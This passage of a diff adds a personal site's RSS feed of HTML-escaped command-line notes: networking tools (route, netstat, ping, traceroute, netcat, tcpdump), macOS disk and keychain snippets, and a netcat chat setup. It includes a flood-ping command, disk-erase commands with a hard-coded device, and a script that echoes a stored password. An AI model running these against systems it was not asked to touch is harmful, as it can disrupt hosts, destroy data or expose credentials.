+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# so that traffice for 192.168.1.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# communicates over the 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo route -n add 192.168.1.0/24 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;delete a route&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo route -n delete 192.168.1.0/24 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;netstat&#34;&gt;netstat&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;view info on all sockets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -at
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;network info for ipv6&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -lt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;per protocol network statistics&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -s
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;statistics for a specific network protocol&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -p igmp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;statistics for network interfaces&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -i
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;view network info as it happens&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ntop
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ping&#34;&gt;ping&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;put a delay in pings&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping -i 5 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;ping hostname 5 times and then stop&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping -c 5 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;flood ping the host&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping -f location
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;set packet size during ping&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping -s 100 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;customize source ip during ping&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping -S 192.168.1.160 192.168.1.253
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;trace&#34;&gt;trace&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;trace the path packets go through&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;traceroute baidu.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;without looking up names&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;traceroute -n baidu.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;in debug mode&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;traceroute -d baidu.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nc&#34;&gt;nc&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;establish a network connection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -v baidu.com 80
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;establish a network connection over port 2195&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -v -w 15 baidu.com 2196
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;establish a network connection only allowing ipv4&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -v -4 baidu.com 2196
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;setup a network listener on port 2196 for testing&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -l -p 2196
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;tcpdump&#34;&gt;tcpdump&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;capture some packets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nS
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;capture all packets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nnvvXS
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;capture packets for port&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nnvvXs 548
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;capture all packets for a given port going to destination 192.168.1.160&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nnvvXs 548 dst 192.168.1.160
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;capture packets as above but dump to a pcap file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -nnvvXs 548 dst 192.168.1.160 -w /tmp/demo.pcap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;read tcpdump (cap) files and make them human readable&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -qns 0 -A -r /tmp/demo.pcap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;other&#34;&gt;other&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;flush the dns cache&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dscacheutil -flushcache
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;clear arp cache&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp -ad
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;what binaries have what ports and in what states are those ports&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsof -n -i4TCP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;make an alias for looking at what has a listener open, called ports&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alias ports=&amp;#39;lsof -n -i4TCP | grep LISTEN&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;edit hosts file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vim /private/etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Mac Snippets</title>
+      <link>http://localhost:1313/mac-snippets/</link>
+      <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/mac-snippets/</guid>
+      <description>&lt;h2 id=&#34;code-snippets&#34;&gt;Code Snippets&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;remove duplicates from $PATH&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;typeset&lt;/span&gt; -U PATH
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;link airport&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;partition USB&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo diskutil partitionDisk /dev/disk2 &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; GPT ExFAT Tails 32G APFS Keys 10M ExFAT Drive 1G ExFAT Go&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;Drive R
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo diskutil apfs encryptVolume disk3s1 -user disk
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;format USB&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;diskutil erasedisk ExFAT GoDrive disk2 &lt;span class=&#34;c1&#34;&gt;#format for Linux only&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;diskutil erasedisk MS-DOS GODRIVE disk2 &lt;span class=&#34;c1&#34;&gt;#format for Mac/Linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;write image to usb&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo gdd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;~/Downloads/debian.iso &lt;span class=&#34;nv&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/disk2 &lt;span class=&#34;nv&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;progress &lt;span class=&#34;nv&#34;&gt;bs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4M
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;unload macfuse kernel&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo kextunload -b io.macfuse.filesystems.macfuse
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;password-snippets&#34;&gt;Password Snippets&lt;/h2&gt;
+&lt;p&gt;Storing and retrieving passwords in bash scripts from the macOS keychain
+#password&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Allow access to macOS keychain (use only if creating keychains remote)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;security -i unlock-keychain
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Set up password in macOS keychain
+&lt;ul&gt;
+&lt;li&gt;-T = immediately grant access without GUI confirmation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;security add-generic-password -T /usr/bin/security -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;Keychain item name here&amp;#34;&lt;/span&gt; -a &lt;span class=&#34;s2&#34;&gt;&amp;#34;username here&amp;#34;&lt;/span&gt; -w
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Retrieve the password in a script like this:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;PASSWORD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;security find-generic-password -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;Keychain item name here&amp;#34;&lt;/span&gt; -a &lt;span class=&#34;s2&#34;&gt;&amp;#34;username here&amp;#34;&lt;/span&gt; -w&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Error catching for passwords&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;pw_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CLI Test&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;pw_account&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;armin&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; ! &lt;span class=&#34;nv&#34;&gt;cli_password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;security find-generic-password -w -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pw_name&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -a &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pw_account&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;could not get password, error &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$?&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;the password is &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$cli_password&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;sudo-password-touchid&#34;&gt;Sudo Password TouchID&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;edit &lt;code&gt;/etc/pam.d/sudo&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;add following line to the top&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth       sufficient     pam_tid.so
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>Netcat Chat Server</title>
+      <link>http://localhost:1313/netcat-chat-server/</link>
+      <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/netcat-chat-server/</guid>
+      <description>&lt;h2 id=&#34;local-host&#34;&gt;Local Host&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcat -l -p 1299
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;connecting-host&#34;&gt;Connecting Host&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcat localhost 1299
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>SSH Keys</title>
+      <link>http://localhost:1313/ssh-keys/</link>
